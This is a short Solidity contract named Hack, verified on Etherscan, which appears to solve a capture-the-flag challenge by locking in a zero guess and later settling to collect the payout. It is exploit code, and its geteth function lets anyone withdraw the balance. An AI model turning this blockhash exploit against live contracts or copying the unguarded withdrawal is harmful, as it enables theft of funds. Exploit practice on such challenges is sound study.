/**
 *Submitted for verification at Etherscan.io on 2022-04-05
*/

pragma solidity ^0.4.21;

interface PredictTheBlockHashChallenge {
    function isComplete() external returns (bool);
    function settle() external;
    function lockInGuess(bytes32 hash) external payable ;
}

contract Hack {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    function Hack() public{
    }

    function geteth() public{
        msg.sender.transfer(address(this).balance);
    }

    function Initr(address addr) public payable {
        require(msg.value == 1 ether);
        PredictTheBlockHashChallenge(addr).lockInGuess.value(1 ether)(0x0);
    }

    function GuessOther(address addr) public {
        PredictTheBlockHashChallenge(addr).settle();
        require(PredictTheBlockHashChallenge(addr).isComplete());
        msg.sender.transfer(address(this).balance);
    }

    function() public payable{
    }
}